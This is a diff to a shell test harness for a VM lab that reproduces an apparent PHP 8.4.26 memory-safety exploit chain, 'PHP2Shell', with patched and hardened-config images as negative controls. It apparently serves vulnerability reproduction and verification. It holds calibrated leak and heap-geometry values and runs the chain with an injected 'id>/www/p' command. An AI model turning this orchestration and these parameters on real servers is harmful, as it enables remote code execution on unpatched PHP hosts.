@@ -128,20 +128,88 @@ say "vm:   $VM_DIR (ssh $VM_SSH_PORT, seed $VM_SEED_PORT)"
 say "log:  $LOG"
 
 command -v qemu-system-x86_64 >/dev/null || die "qemu-system-x86_64 is required"
+command -v jq >/dev/null || die "jq is required (host API specs + profile)"
+command -v python3 >/dev/null || die "python3 is required (port allocation)"
 [ -r /dev/kvm ] && [ -w /dev/kvm ] || die "/dev/kvm must be readable/writable"
+
+# ---------------------------------------------------------------------------
+# 0. Calibration profile
+# ---------------------------------------------------------------------------
+# The leak parameters and the stage-3 geometry are measured values, not
+# guesses. They live in a profile file that records the exact image digest and
+# the real proof. Without a stage-3 geometry the runner asserts only the
+# memory-safety primitives and says so; it never reports a chain it did not
+# run. P2S_STAGE1_N / P2S_FORGE_LEN / P2S_STAGE2_T / P2S_STAGE2_V /
+# P2S_STAGE3_HTDATA / P2S_STAGE3_PADS override the profile (fail closed when
+# only one of the two stage-3 values is supplied).
+PROFILE=${P2S_PROFILE:-$LAB_DIR/calibration/php-8.4.26-apache-trixie.json}
+P_STAGE1_N=841
+P_FORGE_LEN=63
+P_STAGE2_T=406
+P_STAGE2_V=16
+P_HTDATA=
+P_PADS=
+P_COOKIE=0
+P_STAGE3_VERIFIED=0
+if [ -f "$PROFILE" ]; then
+  jq -e . "$PROFILE" >/dev/null 2>&1 || die "malformed calibration profile: $PROFILE"
+  P_STAGE1_N=$(jq -r '.stage1_n // 841' "$PROFILE")
+  P_FORGE_LEN=$(jq -r '.stage1_forge_len // 63' "$PROFILE")
+  P_STAGE2_T=$(jq -r '.stage2_t // 406' "$PROFILE")
+  P_STAGE2_V=$(jq -r '.stage2_v // 16' "$PROFILE")
+  P_HTDATA=$(jq -r '.stage3.htdata // empty' "$PROFILE")
+  P_PADS=$(jq -r '(.stage3.pads // []) | map("\(.[0]):\(.[1])") | join(",")' "$PROFILE")
+  P_COOKIE=$(jq -r 'if .stage3.cookie == true then 1 else 0 end' "$PROFILE")
+  P_STAGE3_VERIFIED=$(jq -r 'if (.stage3.verified == true and (.stage3.htdata // "") != "" and ((.stage3.pads // []) | length) > 0) then 1 else 0 end' "$PROFILE")
+fi
+STAGE1_N=${P2S_STAGE1_N:-$P_STAGE1_N}
+FORGE_LEN=${P2S_FORGE_LEN:-$P_FORGE_LEN}
+STAGE2_T=${P2S_STAGE2_T:-$P_STAGE2_T}
+STAGE2_V=${P2S_STAGE2_V:-$P_STAGE2_V}
+STAGE3_HTDATA=${P2S_STAGE3_HTDATA:-$P_HTDATA}
+STAGE3_PADS=${P2S_STAGE3_PADS:-$P_PADS}
+RCE_ENABLED=0
+if [ -n "${P2S_STAGE3_HTDATA:-}" ] || [ -n "${P2S_STAGE3_PADS:-}" ]; then
+  # Explicit operator override: enabled only when both halves are present.
+  [ -n "$STAGE3_HTDATA" ] && [ -n "$STAGE3_PADS" ] ||
+    die "stage 3 needs BOTH P2S_STAGE3_HTDATA and P2S_STAGE3_PADS"
+  RCE_ENABLED=1
+elif [ "$P_STAGE3_VERIFIED" = 1 ]; then
+  RCE_ENABLED=1
+fi
+STAGE3_ENV="P2S_STAGE3_PADS='$STAGE3_PADS'"
+if [ "$P_COOKIE" = 1 ]; then
+  STAGE3_ENV="$STAGE3_ENV P2S_STAGE3_COOKIE=1"
+fi
+say "calibration profile: $PROFILE"
+say "  leaks: N=$STAGE1_N forge=$FORGE_LEN T=$STAGE2_T V=$STAGE2_V"
+if [ "$RCE_ENABLED" = 1 ]; then
+  say "  stage 3: htdata=$STAGE3_HTDATA pads=$STAGE3_PADS (RCE asserted)"
+else
+  say "  stage 3: NOT CALIBRATED (leak primitives only; RCE not asserted)"
+fi
 
 # ---------------------------------------------------------------------------
 # 1. Images (host-side, unprivileged)
 # ---------------------------------------------------------------------------
 if [ "${P2S_SKIP_BUILD:-0}" != 1 ]; then
-  say "==> building images (host, unprivileged)"
-  "$LAB_DIR/build.sh" || fail "image build failed"
+  if [ "${P2S_GUEST:-official}" = source ]; then
+    say "==> building images from source (host, unprivileged)"
+    "$LAB_DIR/build.sh" || fail "image build failed"
+  else
+    say "==> building images from the pinned official OCI image (host, unprivileged)"
+    "$LAB_DIR/build-oci.sh" || fail "official-image build failed"
+  fi
 else
   say "==> P2S_SKIP_BUILD=1: using cached images"
 fi
 for name in php2shell-vuln php2shell-patched php2shell-hardened; do
   [ -f "$IMAGES/$name/rootfs.ext4" ] && [ -f "$IMAGES/$name/vmlinux" ] &&
-    [ -f "$IMAGES/$name/offsets.env" ] || fail "missing image $name (run build.sh)"
+    [ -f "$IMAGES/$name/offsets.env" ] || fail "missing image $name (run build-oci.sh)"
+  if [ "${P2S_GUEST:-official}" != source ]; then
+    grep -qx 'APACHE=official-image' "$IMAGES/$name/meta.env" 2>/dev/null ||
+      fail "image $name is not an official-image guest (rebuild with build-oci.sh --force)"
+  fi
 done
 
 # ---------------------------------------------------------------------------
@@ -338,7 +406,9 @@ start_tunnel() { # start_tunnel <guestIp>; sets TUNNEL_PID
       >/tmp/p2s-tunnel.log 2>&1 & echo \$! >/tmp/p2s-tunnel.pid"
   TUNNEL_PID=$(vm_ssh 'cat /tmp/p2s-tunnel.pid') || fail "tunnel did not start"
   for _ in $(seq 1 40); do
-    if vm_ssh "curl -fsS --max-time 2 -o /dev/null http://127.0.0.1:$FWD_PORT/index.php" 2>/dev/null; then
+    # Probe /version.php, not /index.php: the chain's landing page must not be
+    # touched by anything except the chain itself.
+    if vm_ssh "curl -fsS --max-time 2 -o /dev/null http://127.0.0.1:$FWD_PORT/version.php" 2>/dev/null; then
       return 0
     fi
     sleep 0.5
@@ -347,78 +417,130 @@ start_tunnel() { # start_tunnel <guestIp>; sets TUNNEL_PID
   fail "ssh -L tunnel to $gip:8080 did not become ready"
 }
 
-target_version() { # target_version: PHP version served through the tunnel
-  vm_ssh "curl -fsS --max-time 10 http://127.0.0.1:$FWD_PORT/index.php" |
-    sed -n 's/^PHP \([0-9][0-9.]*\)$/\1/p' | head -1
+target_info() { # target_info: PHP version and memory_limit from /version.php
+  vm_ssh "curl -fsS --max-time 10 http://127.0.0.1:$FWD_PORT/version.php"
+}
+
+assert_target() { # assert_target <php-version> <memory-limit> <label>
+  local want_ver=$1 want_lim=$2 label=$3 info ver lim
+  info=$(target_info) || fail "$label: /version.php is unreachable"
+  ver=$(printf '%s\n' "$info" | sed -n 's/^PHP //p' | head -1)
+  lim=$(printf '%s\n' "$info" | sed -n 's/^MEMORY_LIMIT //p' | head -1)
+  [ "$ver" = "$want_ver" ] || fail "$label serves PHP '$ver', expected $want_ver"
+  [ "$lim" = "$want_lim" ] || fail "$label has memory_limit '$lim', expected $want_lim"
+  say "target serves PHP $ver, memory_limit=$lim"
 }
 
 stage_toolkit() {
   local tgz
+  if [ ! -d "$TOOLKIT" ] || [ ! -f "$UPSTREAM_LEGACY/exploit.py" ]; then
+    "$LAB_DIR/fetch.sh" --toolkit-only || fail "could not fetch the pinned toolkit"
+  fi
   tgz=$(mktemp "${TMPDIR:-/tmp}/p2s-toolkit.XXXXXX.tgz")
   tar czf "$tgz" -C "$CACHE" toolkit upstream-legacy
   vm_ssh 'rm -rf /tmp/p2s && mkdir -p /tmp/p2s && tar xzf - -C /tmp/p2s' <"$tgz" ||
     fail "could not stage the toolkit"
   rm -f "$tgz"
+  vm_ssh 'mkdir -p /tmp/p2s/lab' || fail "could not create the helper directory"
+  vm_ssh 'cat > /tmp/p2s/lab/leaks.py' <"$LAB_DIR/leaks.py" ||
+    fail "could not stage the leak helper"
+  vm_ssh 'cat > /tmp/p2s/lab/chain.py' <"$LAB_DIR/chain.py" ||
+    fail "could not stage the chain helper"
+  vm_ssh 'cat > /tmp/p2s/lab/amd64.py' <"$LAB_DIR/amd64.py" ||
+    fail "could not stage the amd64 pointer-filter patch"
 }
 
-run_chain() { # run_chain <image> <profile>; prints launcher output
-  local image=$1 profile=$2 zif dtor extra=
+# LEAK_OUT/LEAK_RC are set by run_leaks; its output is also printed so the
+# transcript records the exact stage-1/stage-2 results.
+run_leaks() { # run_leaks <image>
+  local image=$1 zif dtor
   read_offsets "$IMAGES/$image" || fail "no usable offsets for $image"
   zif=$ZIF_OFFSET
   dtor=$DTOR_OFFSET
-  # The toolkit's calibrator measured these over HTTP on the official image
-  # (stage 1 N=841/forge 63, stage 2 T=406/V=16). The launcher's --profile
-  # selects the stage-3 branch; the explicit layout below is the toolkit's
-  # "lab" composition (documented in profiles/php-8.4.26-deb13-apxs2-amd64.json)
-  # and is tried as a second full attempt because stage 3 is build/instance
-  # dependent. Both attempts are real chains; a transport error fails closed.
-  if [ "$profile" = lab ]; then
-    extra="P2S_STAGE3_PADS=4:4,4:4,4:4,4:4,4:4,31:31,31:31,31:31,31:31,31:31,31:31 \
-      P2S_STAGE3_COOKIE=1 P2S_STAGE3_WFIELDS=5 P2S_STAGE3_FAKE_LEN=31 \
-      P2S_STAGE3_FAKES=12 P2S_STAGE3_B_NAME_LEN=3"
-  fi
-  vm_ssh "P2S_STAGE1_N=$P2S_STAGE1_N P2S_FORGE_LEN=$P2S_FORGE_LEN \
-    P2S_STAGE2_T=$P2S_STAGE2_T P2S_STAGE2_V=$P2S_STAGE2_V $extra \
-    timeout 600 python3 /tmp/p2s/toolkit/tools/php2shell_rce.py \
+  LEAK_OUT=$(vm_ssh "timeout 300 python3 /tmp/p2s/lab/leaks.py \
+    -u http://127.0.0.1:$FWD_PORT/index.php \
+    --toolkit /tmp/p2s/toolkit --repo-dir /tmp/p2s/upstream-legacy \
+    --zif-offset $zif --dtor-offset $dtor \
+    --stage1-n $STAGE1_N --stage1-len $FORGE_LEN \
+    --stage2-t $STAGE2_T --stage2-v $STAGE2_V \
+    --command 'id>/tmp/p2s-leak'")
+  LEAK_RC=$?
+  printf '%s\n' "$LEAK_OUT"
+}
+
+assert_leaks_present() { # <image> <label>
+  run_leaks "$1"
+  [ "$LEAK_RC" -eq 0 ] ||
+    fail "$2: the stage-1/2 leaks did not both reproduce (rc=$LEAK_RC)"
+  printf '%s' "$LEAK_OUT" | grep -q '^LEAK_RESULT=both$' ||
+    fail "$2: leak helper did not report both primitives"
+  say "PASS: $2 reproduces the stage-1 stale-id OOM leak and the stage-2 libphp leak"
+}
+
+assert_leaks_absent() { # <image> <label>
+  run_leaks "$1"
+  case "$LEAK_RC" in
+    2) ;;
+    3) fail "$2: leak probe hit a transport/setup error (not a negative result)" ;;
+    *) fail "$2: a leak primitive reproduced (rc=$LEAK_RC); the control is not real" ;;
+  esac
+  printf '%s' "$LEAK_OUT" | grep -q '^LEAK_RESULT=absent$' ||
+    fail "$2: leak helper did not report an absent result"
+  say "PASS: $2: both leak primitives are absent"
+}
+
+run_chain() { # run_chain <image> [huge-mb]; prints the chain transcript
+  local image=$1 huge=${2:-12} zif dtor
+  read_offsets "$IMAGES/$image" || fail "no usable offsets for $image"
+  zif=$ZIF_OFFSET
+  dtor=$DTOR_OFFSET
+  # The parameters are the measured profile values (or explicit env
+  # overrides). chain.py forwards --htdata-offset, which the toolkit launcher
+  # does not expose, and disables docker offset auto-detection. Stage 3 uses
+  # the toolkit's carrier branch for the official image.
+  vm_ssh "P2S_STAGE1_N=$STAGE1_N P2S_FORGE_LEN=$FORGE_LEN \
+    P2S_STAGE2_T=$STAGE2_T P2S_STAGE2_V=$STAGE2_V $STAGE3_ENV \
+    timeout 900 python3 /tmp/p2s/lab/chain.py \
       -u http://127.0.0.1:$FWD_PORT/index.php \
-      -c 'id>/www/p' \
-      --profile $profile \
+      --toolkit /tmp/p2s/toolkit --repo-dir /tmp/p2s/upstream-legacy \
       --zif-offset $zif --dtor-offset $dtor \
-      --repo-dir /tmp/p2s/upstream-legacy \
-      --proof-file '' --fetch /p"
+      --htdata-offset ${STAGE3_HTDATA:-0x690d8} \
+      --profile bookworm --command 'id>/www/p' --fetch /p \
+      --huge-mb $huge"
 }
 
 proof_body() {
   vm_ssh "curl -fsS --max-time 10 http://127.0.0.1:$FWD_PORT/p"
 }
 
-assert_chain_green() { # assert_chain_green <image> <profile>; 0 only on a real proof
-  local image=$1 profile=$2 out body
-  out=$(run_chain "$image" "$profile") || {
-    say "$out"
-    say "  (chain attempt did not complete)"
+assert_chain_green() { # <image> <label>; 0 only on a real, fetched proof
+  local image=$1 label=$2 out rc body
+  out=$(run_chain "$image")
+  rc=$?
+  say "$out"
+  [ "$rc" -eq 0 ] || {
+    say "  ($label: chain did not complete)"
     return 1
   }
-  say "$out"
   printf '%s' "$out" | grep -q '^PROOF:' || {
-    say "  (chain printed no PROOF line)"
+    say "  ($label: chain printed no PROOF line)"
     return 1
   }
   body=$(proof_body) || {
-    say "  (could not fetch /p)"
+    say "  ($label: could not fetch /p)"
     return 1
   }
   proof_is_web_uid "$body" || {
-    say "  (proof is not the web worker uid: $body)"
+    say "  ($label: proof is not the web worker uid: $body)"
     return 1
   }
-  say "PASS: $image executes id as $(printf '%s' "$body" | head -1)"
+  say "PASS: $label executes id as $(printf '%s' "$body" | head -1)"
   return 0
 }
 
-assert_chain_negative() { # assert_chain_negative <image> <profile> <label>
-  local image=$1 profile=$2 label=$3 out rc
-  out=$(run_chain "$image" "$profile")
+assert_chain_negative() { # <image> <label> [huge-mb]
+  local image=$1 label=$2 huge=${3:-12} out rc
+  out=$(run_chain "$image" "$huge")
   rc=$?
   say "$out"
   [ "$rc" -ne 0 ] || fail "$label: chain unexpectedly succeeded"
@@ -434,7 +556,7 @@ assert_chain_negative() { # assert_chain_negative <image> <profile> <label>
 }
 
 # ---------------------------------------------------------------------------
-# 5. Vulnerable image: the chain must execute `id` as the web worker
+# 5. Vulnerable image: leaks must reproduce; the RCE runs only with a profile
 # ---------------------------------------------------------------------------
 say "==> creating the vulnerable instance"
 VID=$(start_instance php2shell-vuln v) || fail "vulnerable instance failed"
@@ -445,50 +567,83 @@ say "guest endpoint: $GIP:8080 (forwarded on 127.0.0.1:$FWD_PORT inside the VM)"
 start_tunnel "$GIP"
 stage_toolkit
 
-VER=$(target_version)
-[ "$VER" = "$PHP_VULN" ] || fail "vulnerable image serves PHP '$VER', expected $PHP_VULN"
-say "target serves PHP $VER"
+assert_target "$PHP_VULN" 8M "vulnerable image"
 
-say "==> running the PHP2Shell chain"
-GREEN=0
-for attempt in $(seq 1 "$P2S_CHAIN_RETRIES"); do
-  for profile in bookworm lab; do
-    say "chain attempt $attempt/$P2S_CHAIN_RETRIES (stage-3 profile: $profile)"
-    if assert_chain_green php2shell-vuln "$profile"; then GREEN=1; break 2; fi
+say "==> asserting the CVE memory-safety primitives (stages 1-2)"
+assert_leaks_present php2shell-vuln "vulnerable PHP $PHP_VULN"
+
+if [ "$RCE_ENABLED" = 1 ]; then
+  say "==> running the calibrated RCE chain (stage 3 htdata=$STAGE3_HTDATA)"
+  GREEN=0
+  for attempt in $(seq 1 "$P2S_CHAIN_RETRIES"); do
+    say "chain attempt $attempt/$P2S_CHAIN_RETRIES"
+    if assert_chain_green php2shell-vuln "vulnerable PHP $PHP_VULN"; then GREEN=1; break; fi
   done
-done
-[ "$GREEN" = 1 ] || fail "the chain did not produce the web-uid proof"
+  [ "$GREEN" = 1 ] || fail "the calibrated chain did not produce the web-uid proof"
+else
+  say "==> stage 3 is NOT CALIBRATED: the RCE is not run and not asserted"
+  [ "${P2S_REQUIRE_RCE:-0}" = 1 ] &&
+    fail "P2S_REQUIRE_RCE=1 but no calibrated stage-3 geometry is available"
+fi
+api_code DELETE "/v1/instances/$VID" >/dev/null 2>&1 || true
+vm_ssh "kill $TUNNEL_PID" >/dev/null 2>&1 || true
+TUNNEL_PID=
 
 # ---------------------------------------------------------------------------
 # 6. Negative control A: fixed PHP 8.4.27
 # ---------------------------------------------------------------------------
 say "==> control A: patched PHP $PHP_FIXED"
-api_code DELETE "/v1/instances/$VID" >/dev/null 2>&1 || true
-vm_ssh "kill $TUNNEL_PID" >/dev/null 2>&1 || true
-TUNNEL_PID=
 PID=$(start_instance php2shell-patched p) || fail "patched instance failed"
 GIP=$(guest_ip "$PID")
 start_tunnel "$GIP"
-VER=$(target_version)
-[ "$VER" = "$PHP_FIXED" ] || fail "patched image serves PHP '$VER', expected $PHP_FIXED"
-say "target serves PHP $VER"
-assert_chain_negative php2shell-patched bookworm "patched PHP $PHP_FIXED"
+assert_target "$PHP_FIXED" 8M "patched image"
+say "==> control A: the leak primitives must be absent"
+assert_leaks_absent php2shell-patched "patched PHP $PHP_FIXED"
+assert_chain_negative php2shell-patched "patched PHP $PHP_FIXED"
 api_code DELETE "/v1/instances/$PID" >/dev/null 2>&1 || true
 vm_ssh "kill $TUNNEL_PID" >/dev/null 2>&1 || true
 TUNNEL_PID=
 
 # ---------------------------------------------------------------------------
-# 7. Negative control B: production-hardened php.ini (memory_limit=128M)
+# 7. Negative control B: hardened php.ini (memory_limit=128M)
 # ---------------------------------------------------------------------------
-say "==> control B: hardened php.ini (memory_limit=128M, OOM field is 12M)"
+say "==> control B: hardened php.ini (memory_limit=128M, shipped OOM body 12M)"
 HID=$(start_instance php2shell-hardened h) || fail "hardened instance failed"
 GIP=$(guest_ip "$HID")
 start_tunnel "$GIP"
-VER=$(target_version)
-[ "$VER" = "$PHP_VULN" ] || fail "hardened image serves PHP '$VER', expected $PHP_VULN"
-say "target serves PHP $VER"
-assert_chain_negative php2shell-hardened bookworm "hardened php.ini"
+assert_target "$PHP_VULN" 128M "hardened image"
+say "==> control B: at its configured limit the 12M OOM field cannot fire,"
+say "    so the stale-id leak must be absent and the chain must fail closed"
+assert_leaks_absent php2shell-hardened "hardened php.ini"
+assert_chain_negative php2shell-hardened "hardened php.ini"
+
+# Informational only (never a pass/fail): the toolkit documents that the same
+# 8.4.26 build is exploitable at 128M when the OOM body is raised to 140M. If
+# enabled, run that variant and record exactly what happens, so RESULTS.md can
+# state whether this control is a configuration control or a mitigation.
+if [ "${P2S_HARDENED_LIMIT_PROBE:-0}" = 1 ]; then
+  say "==> control B informational probe: same image, huge_mb=140 (limit + 12M)"
+  probe_out=$(run_chain php2shell-hardened 140)
+  probe_rc=$?
+  say "$probe_out"
+  probe_body=
+  if [ "$probe_rc" -eq 0 ] && printf '%s' "$probe_out" | grep -q '^PROOF:'; then
+    probe_body=$(proof_body 2>/dev/null) || probe_body=
+  fi
+  if proof_is_web_uid "$probe_body"; then
+    say "OBSERVED: the hardened image DOES execute at huge_mb=140;"
+    say "          control B is a configuration control, not a mitigation."
+  else
+    say "OBSERVED: the hardened image did not produce a proof even at huge_mb=140."
+  fi
+fi
 api_code DELETE "/v1/instances/$HID" >/dev/null 2>&1 || true
 
 say ""
-say "ALL PHP2SHELL LAB CHECKS PASSED"
+if [ "$RCE_ENABLED" = 1 ]; then
+  say "ALL PHP2SHELL LAB CHECKS PASSED (leaks + calibrated RCE + controls)"
+  say "  RCE: VERIFIED with the profile's stage-3 geometry"
+else
+  say "PHP2SHELL LAB CHECKS PASSED (leak primitives + controls)"
+  say "  RCE: NOT ASSERTED (no calibrated stage-3 geometry)"
+fi
